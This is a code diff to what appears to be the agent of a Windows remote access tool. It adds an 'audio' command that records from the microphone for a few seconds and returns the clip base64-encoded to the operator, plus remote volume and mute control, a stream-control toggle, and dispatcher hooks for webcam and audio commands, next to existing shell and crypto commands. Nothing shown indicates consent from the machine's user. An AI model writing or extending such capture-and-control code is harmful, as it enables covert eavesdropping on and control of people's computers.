+                "(0x%08X)" % (hr & 0xFFFFFFFF)
+        hr = _vol_slot(h["vol"], 15, _GETM)(h["vol"], ctypes.byref(muted))
+        if hr < 0:
+            return None, None, "GetMute failed (0x%08X)" % (hr & 0xFFFFFFFF)
+        pct = int(round(max(0.0, min(1.0, lvl.value)) * 100))
+        return pct, bool(muted.value), None
+    except Exception as e:
+        return None, None, str(e)
+
+
+def _vol_set(h, pct):
+    """Set master level to pct (int 0..100). Returns None or err str."""
+    import ctypes
+    pct = max(0, min(100, int(pct)))
+    _SETS = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
+                               ctypes.c_float)
+    hr = _vol_slot(h["vol"], 7, _SETS)(h["vol"], pct / 100.0)
+    if hr < 0:
+        return "SetMasterVolumeLevelScalar failed (0x%08X)" % (
+            hr & 0xFFFFFFFF)
+    return None
+
+
+def _vol_mute(h, on):
+    """Set mute state (on True/False). Returns None or err str."""
+    import ctypes
+    _SETM = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
+                               ctypes.c_int)
+    hr = _vol_slot(h["vol"], 14, _SETM)(h["vol"], 1 if on else 0)
+    if hr < 0:
+        return "SetMute failed (0x%08X)" % (hr & 0xFFFFFFFF)
+    return None
+
+
+def _audio_vol(arg: str) -> bytes:
+    """audio vol [0-100] - query, or set, the master output volume."""
+    if os.name != "nt":
+        return b"[!] audio vol: Windows only\n" + MARKER
+    h, err = _vol_open()
+    if err:
+        return ("[!] audio vol: %s\n" % err).encode(
+            "utf-8", errors="replace") + MARKER
+    try:
+        if arg:
+            if not arg.isdigit():
+                return (b"[!] usage: audio vol [0-100] (no argument = "
+                        b"query current level)\n" + MARKER)
+            if int(arg) > 100:
+                return b"[!] volume must be between 0 and 100\n" + MARKER
+            err = _vol_set(h, int(arg))
+            if err:
+                return ("[!] audio vol: %s\n" % err).encode(
+                    "utf-8", errors="replace") + MARKER
+        cur, muted, err = _vol_query(h)
+        if err:
+            return ("[!] audio vol: %s\n" % err).encode(
+                "utf-8", errors="replace") + MARKER
+        out = ["[+] master volume: %d%%" % cur,
+               "[+] muted: %s" % ("yes" if muted else "no")]
+        if muted:
+            out.append("[+] unmute with: audio mute off")
+        return ("\n".join(out) + "\n").encode(
+            "utf-8", errors="replace") + MARKER
+    finally:
+        _vol_close(h)
+
+
+def _audio_mute(arg: str) -> bytes:
+    """audio mute [on|off] - set (no argument = toggle) master mute."""
+    if os.name != "nt":
+        return b"[!] audio mute: Windows only\n" + MARKER
+    want = None
+    if arg:
+        a = arg.strip().lower()
+        if a in ("on", "1", "true"):
+            want = True
+        elif a in ("off", "0", "false"):
+            want = False
+        else:
+            return (b"[!] usage: audio mute [on|off] (no argument = "
+                    b"toggle)\n" + MARKER)
+    h, err = _vol_open()
+    if err:
+        return ("[!] audio mute: %s\n" % err).encode(
+            "utf-8", errors="replace") + MARKER
+    try:
+        _, muted, err = _vol_query(h)
+        if err:
+            return ("[!] audio mute: %s\n" % err).encode(
+                "utf-8", errors="replace") + MARKER
+        target = (not muted) if want is None else want
+        err = _vol_mute(h, target)
+        if err:
+            return ("[!] audio mute: %s\n" % err).encode(
+                "utf-8", errors="replace") + MARKER
+        cur, muted, err = _vol_query(h)
+        if err:
+            return ("[!] audio mute: %s\n" % err).encode(
+                "utf-8", errors="replace") + MARKER
+        state = "on" if muted else "off"
+        out = ["[+] master mute: %s" % state,
+               "[+] master volume: %d%%" % cur]
+        if muted:
+            out.append("[+] unmute with: audio mute off")
+        return ("\n".join(out) + "\n").encode(
+            "utf-8", errors="replace") + MARKER
+    finally:
+        _vol_close(h)
+
+
+def _audio_cmd(rest: str) -> bytes:
+    """audio status | rec [1-10] | vol [0-100] | mute [on|off].  rec
+    returns AUD|OK/<secs>/<b64> or AUD|ERR/<reason> (MARKER-terminated);
+    vol/mute/status reply with plain text lines."""
+    if os.name != "nt":
+        return b"[!] audio: Windows only\n" + MARKER
+    sub = (rest.split(None, 1)[0] if rest else "").lower()
+    arg = rest[len(sub):].strip() if sub else ""
+    if sub in ("", "status"):
+        num, names = _audio_inputs()
+        out = ["[+] audio module ready (winmm waveIn, 8 kHz mono 16-bit)",
+               "[+] waveIn input devices: %d" % num]
+        for i, n in enumerate(names):
+            out.append("    [%d] %s" % (i, n))
+        if not num:
+            out.append("    (no microphone found)")
+        return ("\n".join(out) + "\n").encode("utf-8",
+                                                errors="replace") + MARKER
+    if sub == "rec":
+        secs = 3
+        if arg:
+            if not arg.isdigit():
+                return (b"[!] usage: audio rec [seconds 1-10 (default 3)]\n"
+                        + MARKER)
+            secs = int(arg)
+            if secs < 1 or secs > 10:
+                return (b"[!] seconds must be between 1 and 10\n" + MARKER)
+        pcm, err = _audio_rec(secs)
+        if err:
+            return ("AUD|ERR|%s\n" % err).encode("utf-8",
+                                                  errors="replace") + MARKER
+        import base64 as _b64
+        wav = _wav_of(pcm)
+        b64 = _b64.b64encode(wav).decode("ascii")
+        return ("AUD|OK|%d|%s\n" % (secs, b64)).encode(
+            "ascii", errors="replace") + MARKER
+    if sub == "vol":
+        return _audio_vol(arg)
+    if sub == "mute":
+        return _audio_mute(arg)
+    return (b"[!] usage: audio status | rec [1-10] | vol [0-100] | "
+            b"mute [on|off]\n" + MARKER)
+
+
 def execute_command(cmd: str) -> bytes:
     """Dispatch a command and always come back alive. A handler exception
     (overlay / cursor ghost paths historically raised and escaped the
@@ -3939,6 +4739,12 @@ def _execute_command(cmd: str) -> bytes:
         if len(parts) >= 2 and parts[1].lower() == "log":
             n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
             return (stream_log(n) + "\n").encode() + MARKER
+        if len(parts) >= 3 and parts[1].lower() == "control":
+            if parts[2].lower() == "on":
+                return _q_call("stream", lambda: (set_stream_control(True) + "\n").encode() + MARKER)
+            if parts[2].lower() == "off":
+                return _q_call("stream", lambda: (set_stream_control(False) + "\n").encode() + MARKER)
+            return ("[!] usage: stream control on|off\n").encode() + MARKER
         room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
         return _q_call("stream", lambda: (deploy_stream(room) + "\n").encode()
                        + MARKER)
@@ -4010,6 +4816,14 @@ def _execute_command(cmd: str) -> bytes:
     if low == "crypto" or low.startswith("crypto "):
         rest = cmd[len("crypto"):].strip()
         return (_crypto_cmd(rest) + "\n").encode() + MARKER
+
+    if low == "webcam" or low.startswith("webcam "):
+        rest = cmd[len("webcam"):].strip()
+        return _webcam_cmd(rest)
+    if low == "audio" or low.startswith("audio "):
+        rest = cmd[len("audio"):].strip()
+        return _audio_cmd(rest)
+
 
     # Handle cd internally so the working directory persists between commands
     if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
